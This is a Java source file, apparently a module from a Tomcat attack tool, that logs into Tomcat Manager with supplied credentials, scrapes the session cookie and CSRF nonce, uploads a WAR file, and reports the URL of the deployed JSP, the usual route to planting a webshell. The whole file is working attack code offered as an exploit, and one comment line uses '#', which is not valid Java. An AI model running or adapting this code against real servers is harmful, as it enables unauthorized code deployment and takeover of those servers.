package org.dudu.TomcatVuln.Exploit;


import org.dudu.TomcatVuln.Common;
import org.dudu.TomcatVuln.DTO.PasswordExpDTO;
import org.dudu.TomcatVuln.DTO.PasswordRequestDTO;
import org.dudu.TomcatVuln.Interface.strategy.ExecuteStrategy;
import org.dudu.TomcatVuln.request.HttpRequest;
import org.dudu.TomcatVuln.utils.ConnectUtil;

import java.io.IOException;
import java.net.HttpURLConnection;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class PassWordExploit extends HttpRequest<PasswordExpDTO,String> implements ExecuteStrategy<PasswordExpDTO>  {
    @Override
    public String mark() {
        return "password";
    }

    @Override
    public String execute(PasswordExpDTO requestParam) throws Exception {
	#获得csrf的token随机值
        String CSRF_NONCE = request(requestParam);
        setConnection(requestParam.getUrl()+Common.PASSWOEDUPLOAD+CSRF_NONCE);
        connection.setRequestMethod("POST");
        connection.setRequestProperty("Authorization", "Basic "+requestParam.getBase64_content());
        connection.setDoOutput(true);
        connection.setRequestProperty("Cookie",requestParam.getCookie());
        connection.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + Common.BOUNDARY);
        int code = ConnectUtil.uploadFile(connection, requestParam.getFilename(),requestParam.getFilePath());
        String dir = requestParam.getFilename().substring(0, requestParam.getFilename().indexOf("."));
        if(code==200) return "war包上传成功，访问路径："+requestParam.getUrl()+"/"+dir+"/"+dir+".jsp";
        return "war包上传失败";
    }

    @Override
    protected String request(PasswordExpDTO requestParam) throws IOException {
        String url = requestParam.getUrl()+ Common.MANAGERNAME;
        this.setConnection(url);
        connection.setRequestProperty("Authorization","Basic "+requestParam.getBase64_content());
        connection.setRequestMethod("GET");
        connection.connect();
        String cookieHeader = connection.getHeaderField(Common.HEADERCOOKIE);
        String[] cookies = cookieHeader.split(";");
        requestParam.setCookie(cookies[0]);
        String responseContent = ConnectUtil.getResponseContent(connection.getInputStream());
        String CSRF_NONCE = ConnectUtil.matcher(responseContent);
        requestParam.setCsrfNonceValue(CSRF_NONCE);
        return CSRF_NONCE;
    }
}
